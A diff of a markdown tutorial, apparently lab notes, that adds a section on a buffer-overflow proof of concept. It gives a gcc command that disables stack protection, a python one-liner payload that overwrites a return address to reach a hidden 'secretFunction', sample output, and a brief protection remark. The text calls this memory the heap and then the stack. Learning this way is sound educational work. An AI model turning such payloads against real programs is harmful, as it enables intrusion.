@@ -378,12 +378,26 @@ int main()
  */
 
 ```
-> *explanation:*  the goal of this PoC is to execute the hidden function
+> *explanation:*  the goal of this PoC is to execute the hidden function `secretFunction`
 
 ### b - compile and analyse
 According to [this forum discussion](https://stackoverflow.com/questions/2340259/how-to-turn-off-gcc-compiler-optimization-to-enable-buffer-overflow), we have to compile with additional options to deactivate memory protection and force 32-bit architecture.
 `$ gcc demo-heap.c -o vuln -m32 -fno-stack-protector -z execstack -no-pie`
-Now, thanks to objdump,
+Now, thanks to objdump, we can read the adress of `secretFunction` at offset `0x804848b`. In the "echo" function, a scanf is used to read user's input and place the content into `buffer` pointer. At the end of the function, the retq primitive jump to the parent caller `main` whose address is stored in the heap.
+
+### c - exploit
+We can overwrite the heap with the address of our hidden function :   
+```bash
+$ python -c 'print "a"*32 + "\x8b\x84\x04\x08"' | ./vuln
+You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
+    Congratulations!
+    You have entered in the secret function!
+    Let's find here a Reverse shell .. ie
+    Erreur de segmentation
+```
+
+### d - how to protect
+In fact, we had to deactivate heap security for compilation ; so don't do that ! The virtual memory protect the stack with canary to ensure no one is hacking it !
 
 ## E - Fuzzing
 Let's reuse the code of the part A (Crack Emily) and design a script to rewrite (one bit a time) the binary in order to get a patched version (ie: OK whatever the input)
@@ -391,4 +405,5 @@ Let's reuse the code of the part A (Crack Emily) and design a script to rewrite 
 Even if we apply such a script on the desired range ( `0x861-0x870` ), the number of possibilities is too important (at least 255^14 = 4,9154414350646441771130432128906e+33).   
 To conclude, a bruteforce approche will never end ! Maybe smarter system such as AI or genetic algorithms could help.
 
-## F - 
+## F - Sign binaries
+
